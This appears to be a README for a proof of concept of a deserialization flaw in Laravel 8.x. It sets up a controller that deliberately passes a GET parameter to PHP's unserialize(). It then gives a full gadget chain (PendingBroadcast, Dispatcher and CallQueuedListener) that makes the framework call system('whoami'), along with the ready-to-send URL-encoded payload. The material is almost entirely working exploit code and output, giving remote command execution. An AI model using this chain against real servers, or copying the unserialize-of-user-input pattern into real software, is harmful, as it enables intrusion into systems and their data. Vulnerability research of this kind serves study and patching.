# laravel-8.x-deserialization-vulnerability
# env build
add route in route/web.php
```
Route::get('/', "\App\Http\Controllers\DemoController@demo");
```
add Controller
```php
<?php
namespace App\Http\Controllers;
class DemoController extends Controller
{
    public function demo()
    {
        if(isset($_GET['c'])){
            $code = $_GET['c'];
            unserialize($code);
        }
        else{
            highlight_file(__FILE__);
        }
        return "Welcome to laravel ".app()::VERSION;;
    }
}                                  
```
![](123.png)

# exp
```php
<?php
namespace Illuminate\Broadcasting{
    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct($events="",$event="")
        {
            $this->events = $events;
            $this->event = $event;
        }
    }
}
namespace Illuminate\Bus{
    class Dispatcher
    {
         protected $queueResolver = "system";
    }
}
namespace Illuminate\Events{
    class CallQueuedListener
    {
      public $connection = "whoami";
    }
}
namespace{
    $a = new Illuminate\Bus\Dispatcher();
    $b = new Illuminate\Events\CallQueuedListener();
    $c = new Illuminate\Broadcasting\PendingBroadcast($a,$b);
    echo urlencode(serialize($c));
}
?>
```
output
```
O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A36%3A%22Illuminate%5CEvents%5CCallQueuedListener%22%3A1%3A%7Bs%3A10%3A%22connection%22%3Bs%3A6%3A%22whoami%22%3B%7D%7D
```
then visit `c=O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A36%3A%22Illuminate%5CEvents%5CCallQueuedListener%22%3A1%3A%7Bs%3A10%3A%22connection%22%3Bs%3A6%3A%22whoami%22%3B%7D%7D`
![2.png]
